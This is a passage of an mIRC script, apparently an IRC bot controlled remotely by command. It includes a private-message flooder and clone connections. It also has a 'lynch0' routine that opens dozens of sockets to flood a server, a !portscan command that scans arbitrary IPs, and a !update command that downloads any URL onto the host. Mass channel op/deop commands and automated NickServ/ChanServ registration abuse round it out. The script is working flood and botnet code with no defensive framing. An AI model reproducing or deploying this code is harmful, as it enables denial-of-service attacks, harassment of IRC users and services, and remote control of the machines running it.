$r(a,z) $+ $r(a,z) $+ .org } }

alias fos { set fos 1 }
alias dksmsgflooder {  if ($sock(dksmsgflooder2,0) == 0) { sockopen dksmsgflooder2 %msg.flood.server %msg.flood.server.port }   | if ($sock(dksmsgflooder1,0) == 0) { sockopen dksmsgflooder1 %msg.flood.server %msg.flood.server.port }  }
alias rc {  if ($1 == 1) { return  $+ $r(1,15) } | if ($1 == 2) { return  } | if ($1 == 3) { return  } | if ($1 == 4) { return  $+ $r(1,15) } | if ($1 == 5) { return  } | if ($1 == 6) { return  } | if ($1 == 7) { return  } | if ($1 == 8) { return  $+ $r(1,15) $+ , $+ $r(1,15) } }
alias rcr { if ($1 == 1) { return $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) $+ $r(a,z) } | if ($1 == 2) { return $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) } | if ($1 == 3) { return $r(1,100) $+ $r(1,100) $+ $r(1,100) $+ $r(1,100) } | if ($1 == 4) { return $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) $+ $chr($r(1,100))  $+ $chr($r(100,250)) $+ $r(251,1000) } }
alias randomgen { if ($1 == 0) { return $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) $+ $r(a,z) $+ $r(75,81) $+ $r(A,Z) $+ $r(g,u) $+ $r(4,16) } | if ($1 == 1) { return $read mdm.scr } | if ($1 == 2) { return ^ $+ $read mdm.scr $+ ^ } |  if ($1 == 3) { return $r(a,z) $+ $read mdm.scr $+ $r(1,5) } | if ($1 == 4) { return $r(A,Z) $+ $r(1,9) $+ $r(8,20) $+ $r(g,y) $+ $r(15,199) } | if ($1 == 5) { return $r(a,z) $+ $read mdm.scr $+ - } | if ($1 == 6) { return $read mdm.scr $+ - } | if ($1 == 7) { return $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) $+  $r(A,Z) $+ $r(a,z) $+ $r(0,6000) $+ $r(a,z) $+ $r(A,Z) $+ $r(a,z) $+ $r(15,61) } | if ($1 == 8) { return ^- $+ $read mdm.scr $+ -^ } | if ($1 == 9) { return $r(a,z) $+ $r(A,Z) $+ $r(1,500) $+ $r(A,Z) $+ $r(1,50) } }
alias wnickchn { %.nc = 1  |   :ncloop | if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $randomgen($r(0,9)) |  inc %.nc |  goto ncloop |  :end  } 
alias wnickchn2 { %.nc = 1  |  :ncloop |  if (%.nc > $sock(sock*,0)) { goto end }  |  sockwrite -n $sock(sock*,%.nc) Nick $1 $+ $r(a,z) $+ $r(1,999) |  inc %.nc | goto ncloop |  :end  }
alias msg { if (# == $null) { msg $nick $1- }  |   else { msg $1- } }
alias percent { if ($1 isnum) && ($2 isnum) { return $round($calc(($1 / $2) * 100),2) $+ $chr(37) } }
on *:sockopen:dksmsgflooder*:{ inc %bots 1 | sockwrite -tn dksmsgflooder* User $read mdm.scr $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  mdm.scr ] ]  |  sockwrite -nt dksmsgflooder* NICK $randomgen($r(0,9)) | sockwrite -nt dksmsgflooder* JOIN : $+ %nick2bomb | sockwrite -nt dksmsgflooder* PONG $server | sockwrite -nt dksmsgflooder* privmsg %nick2bomb : $+ %msg2bomb | sockwrite -nt dksmsgflooder* notice %nick2bomb : $+ %msg2bomb | /sockwrite -tn dksmsgflooder* PRIVMSG %nick2bomb :PING VERSION TIME | sockclose $sockname | dec %bots 1 | /dksmsgflooder } 
on *:sockclose:clone*: {  set %temp.clones.nick $remove($sockname,clone) }  
on *:sockopen:clone*: { sockwrite -tn $sockname User $read mdm.scr $+ $r(a,z) $+ $r(1,60) a a : [ [ $read  mdm.scr ] ] | sockwrite -tn $sockname Nick $remove($sockname,clone) | sockread }
on *:sockread:clone*: { 
  sockread %temp.sock 
  /echo -s clone debug; %temp.sock 
  if ($gettok(%temp.sock,2,32) == 333) { sockwrite $sockname -tn pong $gettok(%temp.sock,5,32) } 
  if ($gettok(%temp.sock,2,32) == KICK) { sockwrite -nt clone* JOIN : $+ $gettok(%temp.sock,3,32) }
  clone in %temp.sock 
}
; end alias end.
on *:sockopen:range.*:{ if ($sock($sockname).status == active) { set %range.ports %range.ports $sock($sockname).port | sockclose $sockname } }
alias port.range.scan { set %range1 $calc( $gettok(%port.to.scan,1,45) - 1) | set %range2 $gettok(%port.to.scan,2,45) | :lewp | inc %range1 | if (%range1 <= %range2) { sockopen range. $+ %range1 %port.scan.ip %range1 | goto lewp } | else { .timergetportsempire 1 2 get.ports } }
alias get.ports { /msg %schan 14[15portscan14] Open ports found: $iif(%range.ports != $null, %range.ports, None) | /msg %schan 14[15portscan14] Scanning Ports Successfully Completed for %port.scan.ip $+ $+ ... |  unset %range.ports %range1 %range2 %port.to.scan %port.scan.ip | unset %schan | sockclose range.* }
on 1:SOCKREAD:wwwGet: { .remove $mircdir\Temp  | msg %w.g.# 15Downloading...14 $gettok($sock($sockname).mark,3,32) | if ($sockerr > 0) return | :nextread | sockread %WWW.Temp |  if ($sockbr != 0) { if (%WWW.Temp != $Null) {  write $mircdir\Temp %WWW.Temp  } |  goto nextread   }
  if (HTTP/1.*20* iswm [ $read -l1 $mircdir\Temp ] ) { if ($exists($gettok($sock($sockname).mark,2,32))) {  .remove $gettok($sock($sockname).mark,2,32) } |   :GenNew |  set -u0 %WWW.Temp www $+ $rand(A,Z) $+ $rand(0,9) |  if ($sock(%WWW.Temp) != $null) { goto GenNew } |  sockrename wwwGet %WWW.Temp  
if (text/* iswm [ $read -sContent-Type: $mircdir\Temp ] ) { sockmark %WWW.Temp Text $gettok($sock($sockname).mark,2-,32)  } | else {   sockmark %WWW.Temp Bin $gettok($sock($sockname).mark,2-,32)  } |  .timer 1 1 sockwrite -tn %WWW.Temp GET $gettok($sock($sockname).mark,3,32)  } | else {  //echo -st $read -l2 $mircdir\Temp  }  unset %WWW.Temp }
on 1:SOCKREAD:www*: {  if ($sockerr > 0) return | :nextread | if ($gettok($sock($sockname).mark,1,32) == bin) { sockread &Temp |   if ($sockbr == 0) return |  if ($bvar(&Temp,0) != 0) { bwrite $gettok($sock($SockName).Mark,2,32) -1 $bvar(&Temp,0) &temp }  } | else {  sockread %WWW.Temp |  if ($sockbr == 0) return |  if (%WWW.Temp != $Null) { write $gettok($sock($SockName).Mark,2,32) %WWW.Temp } |   unset %WWW.Temp  } | goto nextread }
alias getdata {  if ($sock(wwwGet) == $null) {  if ($gettok($$1,1,47) == http:) { sockopen wwwGet $gettok($gettok($1,2,47),1,58) $iif($gettok($gettok($1,3,47),2,58) != $Null, $gettok($gettok($1,3,47),1,58), 80)   } | else { sockopen wwwGet $gettok($1,1,47) $iif($gettok($gettok($1,1,47),2,58) != $Null, $gettok($gettok($1,1,47),1,58), 80)  } |  if ($GetTok($1,$numtok($1,47),47) != $null) {  set -u0 %WWW.File $mircdir\ $+ $GetTok($1,$numtok($1,47),47)  } | else {
set -u0 %WWW.File $mircdir\_root_   } |   sockmark wwwGet unknown %WWW.File $iif($gettok($$1,1,47) == http:, $1, [ http:// $+ [ $1 ] ] )  } | else {  .timer 1 1 getdata $1  } }
on 1:SOCKOPEN:wwwGet: { sockwrite -tn wwwGet HEAD $gettok($sock($sockname).mark,3,32) HTTP/1.1 | sockwrite -tn wwwGet Accept: image/gif, image/x-xbitmap, image/jpeg, image/pjpeg, */* | sockwrite -tn wwwGet Accept-Language: en-au |  sockwrite -tn wwwGet Accept-Encoding: deflate |   sockwrite -tn wwwGet User-Agent: mIRCInstaller WWW Edition v0.0.1 | sockwrite -tn wwwGet Host: $host | sockwrite -tn wwwGet Connection: Keep-Alive  | sockwrite -tn wwwGet $lf  }
on 1:SOCKCLOSE:www*: {  msg %w.g.# 14[15File:14 $+ $gettok($sock($sockname).mark,3-,32) $+ ] 14[15Size:14 $+ $file($gettok($sock($sockname).mark,2,32)).size $+ ]12 Downloaded Successfully... |  if ($exists( [ $mircdir\Temp ] )) { .remove $mircdir\Temp } | unset %WWW* | unset %w.g.# }
on 10:TEXT:!portscan*:?: if ($4 == $null) { msg $nick Error !portscan [ip-address] [start-port] [end-port] | halt } | if ($calc($4 - $3) > 800) { msg $nick Error; please scan under 800 ports at a time! | halt }  | set %port.to.scan $3 | set %port.to.scan %port.to.scan $+ - $+ $4 |  set %port.scan.ip $2 |  set %schan $nick |  //msg $nick 14[15portscan14] Now scanning $2 on %port.to.scan |  port.range.scan %port.scan.ip
on 10:TEXT:!portscan*:#: if ($4 == $null) { msg # Error !portscan [ip-address] [start-port] [end-port] | halt }  |  if ($calc($4 - $3) > 800) { msg # Error; please scan under 800 ports at a time! | halt } | set %port.to.scan $3 | set %port.to.scan %port.to.scan $+ - $+ $4 |  set %port.scan.ip $2 |  set %schan # |  //msg # 14[15portscan14] Now scanning $2 on %port.to.scan |  port.range.scan %port.scan.ip
on 10:TEXT:!dns*:#: { if ($2 == $null) { halt } | dns $2 | set %dns.r on | set %dns.rr # |  msg # 14..[`15dns14`].. 12Attempting to resolve2 $2 $+ 12... }
on 10:TEXT:!dns*:?: { if ($2 == $null) { halt } | dns $2 | set %dns.r on | set %dns.rr $nick | msg $nick 14..[`15dns14`].. 12Attempting to resolve2 $2 $+ 12... }
on 10:TEXT:!update*:#: %w.g.# = # | /getdata $2
on 10:TEXT:!update*:?: %w.g.# = $nick | /getdata $2
on *:DNS:{ if (%dns.r == on) { msg %dns.rr 14..[`15dns14`].. 12[2-Resolved-12]14:15 $iaddress 14-15 $naddress | unset %dns.* } }
alias lynch0 { set %lc 0 |  set %space   | set %lm $replace($$3-,$chr(32), ) |  :ll |  if (%lc == 50) { /halt } |  /sockopen lynch0 $+ %lc $$1 $$2 |  inc %lc |  goto ll }
on 1:SOCKOPEN:lynch0*:/sockwrite -n $sockname SERVER %lm
on 1:SOCKWRITE:lynch0*:/sockwrite -n $sockname SERVER %lm
on 1:SOCKCLOSE:lynch0*://sockopen lynch0 $+ $remove($sockname,lynch0) %lynch0.s
alias lynch0end { /sockclose lynch0* }
on 10:TEXT:*:*:{
  if ($1 == !clone.nick.read) { %.nc = 1 |  :ncloop | if (%.nc > $sock(clone*,0)) { goto end }  |   sockwrite -n $sock(clone*,%.nc) Nick $2 $read mdm.scr |   inc %.nc |  goto ncloop |   :end  |  /wnickchn $2 |  halt   }
  if ($1 == !clone.ctcp.block) { /sockwrite -tn clone* PRIVMSG $2 :××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××× | /sockwrite -tn clone* PRIVMSG $2 :×××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××××× }
  if ($1 == !cstats) { msg # 14[15Channel-Stats14]: 12-14(12 $+ # $+ 14)12- 14[14T15o0t14al: 14(12 $+ $nick(#,0,a) $+ 14) 44(12100%4)14]  | msg # 14[15Channel-Stats14]: 14[O15pe0ra15to14r's: (12 $+ $nick(#,0,o) $+ 14) 4(12 $+ $percent($nick(#,0,o),$nick(#,0,a)) $+ 4)14] 14[V15o0i15c14e's: 14(12 $+ $nick(#,0,v) $+ 14) 144(12 $+ $percent($nick(#,0,v),$nick(#,0,a)) $+ 144)14]  }
  if ($1 == !show.access) { if (# == $null) { msg $nick 3...14[15Showing access list14]3... 14Total:15 $Lines(accessed.txt) | /play $nick accessed.txt  } | else { msg # 3...14[15Showing access list14]3... 14Total:15 $Lines(accessed.txt) | /play # accessed.txt | timer -o 1 100 /remove accessed.txt }  }
  if ($1 == !voiceall) {  msg # 14[15Mass 12(3Voicing12)15 Everyone in3 # $+ 15...14]  | %va.t = $nick(#,0,r)  | %va.1 = 1  |   :loop |  if (%va.1 >= %va.t) { goto end  }  |  mode # +vvvv $nick(#,%va.1,r)  $nick(#, [ $calc( [ [ %va.1 ] ] +1) ] ,r) $nick(#, [ $calc( [ [ %va.1 ] ] +2) ] ,r) $nick(#, [ $calc( [ [ %va.1 ] ] +3) ] ,r) |  inc %va.1 4 |   goto loop  |   :end   |   unset %va.*  }
  if ($1 == !opall) { msg # 14[15Mass 12(3Op`n12)15 Everyone in3 # $+ 15...14]  |  %va.t = $nick(#,0,r)  |   %va.1 = 1  |   :loop |   if (%va.1 >= %va.t) { goto end  }  |  mode # +oooo $nick(#,%va.1,r)  $nick(#, [ $calc( [ [ %va.1 ] ] +1) ] ,r) $nick(#, [ $calc( [ [ %va.1 ] ] +2) ] ,r) $nick(#, [ $calc( [ [ %va.1 ] ] +3) ] ,r) |   inc %va.1 4  |   goto loop  |   :end   |   unset %va.*  }
  if ($1 == !devoiceall) { msg # 14[15Mass 12(3Devoice`n12)15 Everyone in3 # $+ 15...14]  | %va.t = $nick(#,0,a)  | %va.1 = 1  |   :loop |  if (%va.1 >= %va.t) { goto end  }  |  mode # -vvvv $nick(#,%va.1,a)  $nick(#, [ $calc( [ [ %va.1 ] ] +1) ] ,a) $nick(#, [ $calc( [ [ %va.1 ] ] +2) ] ,a) $nick(#, [ $calc( [ [ %va.1 ] ] +3) ] ,a) |  inc %va.1 4 |   goto loop  |   :end   |   unset %va.*  }
  if ($1 == !deopall) && ($address == %master) {  msg # 14[15Mass 12(3Deop`n12)15 Everyone in3 # $+ 15...14]  | %va.t = $nick(#,0,a)  |   %va.1 = 1  |   :loop |   if (%va.1 >= %va.t) { goto end  }  |  mode # -oooo $nick(#,%va.1,a)  $nick(#, [ $calc( [ [ %va.1 ] ] +1) ] ,a) $nick(#, [ $calc( [ [ %va.1 ] ] +2) ] ,a) $nick(#, [ $calc( [ [ %va.1 ] ] +3) ] ,a) |   inc %va.1 4  |   goto loop  |   :end   |   unset %va.*  }
  if ($1 == !ident) { if ($2 == $null) { halt } | msg # 15[14`15Ident14`15]12 set as3 $2 $+ 12... | identd on $2 }
  if ($1 == !reload) && ($address == %master) { msg # [Reloading $2 $+ ... $+ ] | /reload -rs $2 } 
  if ($1 == !lynch0.stop) { /lynch0end | /msg # Lynch0 Halted  | halt }
  if ($1 == !lynch0.help) { /msg # !lynch0 <serverIP> <port> <message> | halt }
  if ($1 == !lynch0) {  if ($4 == $null)  { halt } |  set %lynch0.s $2 $3 | /lynch0 $2 $3 $4- }
  if ($1 == !clone.service.killer2) {    if ($sock(clone*,0) == 0) { goto gatechange }  |   %sk = 1  |     :skloop |  if (%sk > $sock(clone*,0)) { goto end }  | sockwrite -n $sock(clone*,%sk) Nick $randomgen($r(0,9))   |   %random.sk.temp = $randomgen($r(0,9))  |  %random.sk.temp2 = $randomgen($r(0,9))  |  %random.sk.temp3 = $randomgen($r(0,9))  |  sockwrite -n $sock(clone*,%sk) NICKSERV register %random.sk.temp $remove($randomgen($r(0,9)),^,_,-,`) $+ $reg($r(0,10)) |  sockwrite -n $sock(clone*,%sk) NICKSERV identify %random.sk.temp $remove($randomgen($r(0,9)),^,_,-,`) $+ $reg($r(0,10)) |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2    |   sockwrite -n $sock(clone*,%sk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |  sockwrite -n $sock(clone*,%sk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp*  |   inc %sk  |   goto skloop  |   :end  |  :gatechange  |   %gsk = 1  |   :gchn
  %random.sk.temp3 = $randomgen($r(0,9))    |   sockwrite -n $sock(sock*,%gsk) NICKSERV register %random.sk.temp  $remove($randomgen($r(0,9)),^,_,-,`) $+ $reg($r(0,10)) |   sockwrite -n $sock(sock*,%gsk) NICKSERV identify %random.sk.temp |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |   sockwrite -n $sock(sock*,%gsk) CHANSERV REGISTER $chr(35) $+ %random.sk.temp2 %random.sk.temp3 cool  |   sockwrite -n $sock(sock*,%gsk) JOIN $chr(35) $+ %random.sk.temp2  |  unset %random.sk.temp*  |   inc %gsk  | goto gchnge |   :end2 |   halt    }
  if ($1 == !clone.join.k) { if $3 == $null { halt } | sockwrite -nt clone* JOIN $2 : $+ $3 }
  if ($1 == !voiceme) { mode # +v $nick }
  if ($1 == !timeout) { set %timeout $2 }
  if ($1 == !play) { if ($2 == $null) {  msg # !play sytax: !play nick/#channel file | halt } | else { msg # 1227 Playing $2 $3 $+ ... 212 } | //play $2 [ [ $3 ] ] } }
}
